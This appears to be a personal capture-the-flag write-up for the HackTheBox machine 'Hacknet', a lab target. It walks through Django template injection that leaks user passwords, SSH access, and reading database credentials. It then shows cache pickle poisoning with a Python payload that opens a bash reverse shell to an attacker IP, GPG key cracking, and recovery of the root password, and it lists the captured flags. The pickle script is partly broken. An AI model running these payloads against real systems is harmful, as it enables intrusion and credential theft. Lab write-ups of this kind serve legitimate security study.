---
title: Hacknet
author: Julien Bongars
date: 2025-11
tags:
  - HackTheBox
  - Medium
  - Linux
  - Hacking
---

ip = 10.129.232.4

hosts = hacknet.htb

## website recon

- login page with username and password
- ability to upload file in profile page
- there is a csrfmiddleware token that is injected in each request. This prevents CSRF attacks but only when registering it seems.
- usernames appear to be stored in a database somewhere. Possible SQL injection?

  - "search" page doesn't appear to be injectable... but it doesn't appear to cause a page error?
  - request seem to return status 200 no matter the input

- you can send messages?

  - something very weird... trying to create a new user, gave me "bad credentials". Then I could login but wwhen inside, can't find other users including original user...
  - it appears that I can log into test@gmail and 123@gmail but I can't see the other user?
  - editing profile doesn't appear to decode HTML encoding %2F
  - I can see posts from other users but trying to post a comment leads to a 302 and renders html for the profile page but under the comment section?
  -

- profile image can be updated as a gif?
-

## Possible attack vectors

- image upload
- registration page
- comments on other people's accounts

## Searching for paths?

gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://hacknet.htb -c "csrftoken=0B2CZPErZ4ypt3xrB0mjFZWjA4JlpmNo; sessionid=jazlashdvvqmo3ofhfpqsnilfoazer3v" -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" -b "logout"

### By using the following request, I figured out I am userid = 27

```txt
GET /contacts?action=request&userId=27 HTTP/1.1
Host: hacknet.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hacknet.htb/profile/7
Accept-Encoding: gzip, deflate, br
Cookie: csrftoken=anx3komXrXva92xRqdLt6FLa0EMLZtJT; sessionid=8zprwhphh6gelrzvfb1rqn8beap8qmfg
Connection: keep-alive
```

there are a few "hidden" users for 25,26...30?

test@gmail.com = 27
123@gmail.com = 30

I know the user id is correct and I have accepted my alt account as a contact but I cannot send messages between accounts even if I force the API request.

---

## Additional Recon

- nginx/1.22.1 (no known RCE vulns)
- Django-based app (likely using Django templates)
- AJAX handles form submissions (jQuery)

## User Tiers

- "Main users" (IDs 1-24?): searchable, full functionality
- "Hidden users" (IDs 25+): not in search results, messaging broken
  - Search shows "page 1 no results" vs "no results found" for invalid users
  - Friend requests work but messaging fails even when accepted

## Tested & Failed

- SQL injection on search (returns 200 regardless)
- SSTI payloads ({{7*7}}, Django/Jinja2 variants) in comments/profile
- Image upload RCE (validates blob, preserves filename in /media)
- PHP shell upload (likely not PHP backend)
- CSRF token bypass (tokens validated on registration only)
- Path traversal in article parameter
- Profile enumeration via /profile/1-10000 (found valid IDs)
- Template injection in comments, description, username
- Default credentials (no email addresses known for main users)

## Observations

- /media preserves uploaded filenames
- Comments POST returns 302 to /profile, response HTML prepended via AJAX
- Login requires email but profiles show only username
- No forgot/change password functionality
- Main vs hidden user distinction appears intentional

---

## Looking up a walkthrough because out of my depth

you can change the username of profile to the following and by manipulating the likes, it will reveal the details of users in the likes. Refer to the external walkthrough. We get username: deepdive

```txt
username={{users.values}}
```

Looking for user emails with the domain of hacknet.htb, we can assume these are the admins of this website

```txt
``{
'id': 22,
 'email': 'deepdive@hacknet.htb',
 'username': 'deepdive',
 'password': 'D33pD!v3r',
 'picture': '22.png',
 'about': 'Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.',
 'contact_requests': 0,
 'unread_messages': 0,
 'is_public': False,
 'is_hidden': False,
 'two_fa': True
},
`
```

We are able to log in as this user and we can see he has one friend being backdoor_bandit. From my understanding from the external walkthrough, this is the user we must target.

---

## Back on my own

I was able to get backdoor_bandit credentials using the same method as above. I see the following:-

```bash
{"id": 18, "email": "mikey@hacknet.htb", "username": "backdoor_bandit", "password": "mYd4rks1dEisH3re", "picture": "18.jpg", "about": "Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.", "contact_requests": 0, "unread_messages": 0, "is_public": False, "is_hidden": False, "two_fa": True}
```

2FA seems to be broken...

I was able to get an ssh session by the following

```bash
sshpass "mYd4rks1dEisH3re" ssh mikey@hacknet.htb
```

the user flag is at `/home/mikey/user.txt`

## Privilege Escalation

there is a mysql sock in /run/sqld/sqld.sock
can search for open files using

```bash
ps aux
netstat -tunlp
lsof

# open sockets
lsof -U
```

going to /var/www/Hacknet/settings.py we get sandy's password + db password

```py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}
```

connect to mysql

```bash
# with sock
mysql -u sandy -p'h@ckn3tDBpa$$' -S /run/mysqld/mysqld.sock hacknet

# with tcp
mysql -u sandy -p'h@ckn3tDBpa$$' -h localhost -P 3306 hacknet
```

we find an auth user?

```bash
MariaDB [hacknet]> select * from auth_user
    -> ;
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login                 | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= | 2025-02-05 17:01:02.503833 |            1 | admin    |            |           |       |        1 |         1 | 2024-08-08 18:17:54.472758 |
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
```

let this cook in hashcat

```txt
echo pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= > hash.txt
hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

list of users and their passwords

```txt
MariaDB [hacknet]> select email,username,password from SocialNetwork_socialuser;
+------------------------------+--------------------+------------------+
| email                        | username           | password         |
+------------------------------+--------------------+------------------+
| cyberghost@darkmail.net      | cyberghost         | Gh0stH@cker2024  |
| hexhunter@ciphermail.com     | hexhunter          | H3xHunt3r!       |
| rootbreaker@exploitmail.net  | rootbreaker        | R00tBr3@ker#     |
| zero_day@hushmail.com        | zero_day           | Zer0D@yH@ck      |
| cryptoraven@securemail.org   | cryptoraven        | CrYptoR@ven42    |
| shadowcaster@darkmail.net    | shadowcaster       | Sh@d0wC@st!      |
| blackhat_wolf@cypherx.com    | blackhat_wolf      | Bl@ckW0lfH@ck    |
| bytebandit@exploitmail.net   | bytebandit         | Byt3B@nd!t123    |
| glitch@cypherx.com           | glitch             | Gl1tchH@ckz      |
| datadive@darkmail.net        | datadive           | D@taD1v3r        |
| phreaker@securemail.org      | phreaker           | Phre@k3rH@ck     |
| codebreaker@ciphermail.com   | codebreaker        | C0d3Br3@k!       |
| netninja@hushmail.com        | netninja           | N3tN1nj@2024     |
| packetpirate@exploitmail.net | packetpirate       | P@ck3tP!rat3     |
| darkseeker@darkmail.net      | darkseeker         | D@rkSeek3r#      |
| shadowmancer@cypherx.com     | shadowmancer       | Sh@d0wM@ncer     |
| trojanhorse@securemail.org   | trojanhorse        | Tr0j@nH0rse!     |
| mikey@hacknet.htb            | backdoor_bandit    | mYd4rks1dEisH3re |
| exploit_wizard@hushmail.com  | exploit_wizard     | Expl01tW!zard    |
| stealth_hawk@exploitmail.net | stealth_hawk       | St3@lthH@wk      |
| whitehat@darkmail.net        | whitehat           | Wh!t3H@t2024     |
| deepdive@hacknet.htb         | deepdive           | D33pD!v3r        |
| virus_viper@securemail.org   | virus_viper        | V!rusV!p3r2024   |
| brute_force@ciphermail.com   | brute_force        | BrUt3F0rc3#      |
| shadowwalker@hushmail.com    | shadowwalker       | Sh@dowW@lk2024   |
| t@t.com                      | {{ users.values }} | t                |
+------------------------------+--------------------+------------------+
26 rows in set (0.000 sec)
```

doesn't really show anything we don't know...

---

## Looking at walkthrough because I am out of my depth (again)

The secret is we have global write access to the django cache. We need to poison one of the shells to get a reverse shell

---

under settings.py there is this section

```python
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

exploring the /var/tmp/django_cache folder

it is empty

greping for any mention of cache

```bash
find /var/www/HackNet -type f -name '*.py' | grep -Hn 'cache'
```

we find a ref to cache in the explore page

generate pickle by visiting the explore page

open nc shell in attacker console

```bash
nc -lvnp 4444
```

generate poisoned pickle by executing python code

```python
import pickle
import os
import hashlib
import time

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.146/4444 0>&1"'
        return (os.system, (cmd,))

# Generate a cache key (you might need to guess the right key format)
# Try common cache keys or just create multiple files
payload = pickle.dumps(RCE())

print("filename:", filename)

# Write to cache directory
with open(f'./poison.djcache', 'wb') as f:
    f.write(payload)
```

move the poisoned pickle to the legitamate cache

```bash
mv poisoned.djcache 983289483298243.djcache

ln -s poisoned.djcache <pickle>.djcachr
```

open incognito browser, login and browse to the same page. This will trigger the poisoned cache and open reverse shell.

this will trigger shell. We now are logged in as `sandy`

we find a folder of backups in `/var/www/HackNet/backups` which are populated with gpg encrypted files by sandy. We need to find the keyring to crack this (playing around).

This is the list gpg keys

```bash
/home/sandy/.gnupg/pubring.kbx    # Public keys (newer format)
/home/sandy/.gnupg/secring.gpg    # Secret/private keys (old format)
/home/sandy/.gnupg/private-keys-v1.d/  # Private keys (newer format)
/home/sandy/.gnupg/pubring.gpg    # Public keys (old format)
```

We can also use the following to find keys:-

```bash
find / -type f -name '*.gpg' 2>/dev/null
find / -type f -name 'armored*' 2>/dev/null
```

we find two files in `/home/sandy/.gnupg/private-keys-v1.d/` and we copy it to our target server using the following to transport files safely

```bash
# on target
tar czf - ./ | base64

# on source
echo "PASTE_STRING_HERE" | base64 -d | tar xzf -
```

use john to crack the password

```bash
# Export the private key in a format John/Hashcat can crack
gpg2john /home/sandy/.gnupg/private-keys-v1.d/*.key > sandy_gpg.hash

# Or if you have the armored.asc file
gpg2john armored.asc > sandy_gpg.hash

# using john
john sandy_gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt

# using hashcat
hashcat -m 17010 sandy_gpg.hash /usr/share/wordlists/rockyou.txt
```

We get the password for sandy `sweetheart`

```bash
Sandy:sweetheart:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc
```

root password appears in the logs

```bash
gpg --decrypt /var/www/HackNet/backups/backup01.sql.gpg > /var/www/HackNet/backups/backup01.sql
gpg --decrypt /var/www/HackNet/backups/backup02.sql.gpg > /var/www/HackNet/backups/backup02.sql
gpg --decrypt /var/www/HackNet/backups/backup03.sql.gpg > /var/www/HackNet/backups/backup03.sql

# prompt password is sweetheart
# (password we cracked earlier from armored_key.asc
```

logs:-

```logs
sandy@hacknet:/var/www/HackNet/backups$ cat *.sql | grep password
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
```

root password is h4ck3rs4re3veRywh3re99

---

user flag
e32ca68fa7586d101da414ff7089871b

root flag
087a81fc86d8fc37500d97abd1627537
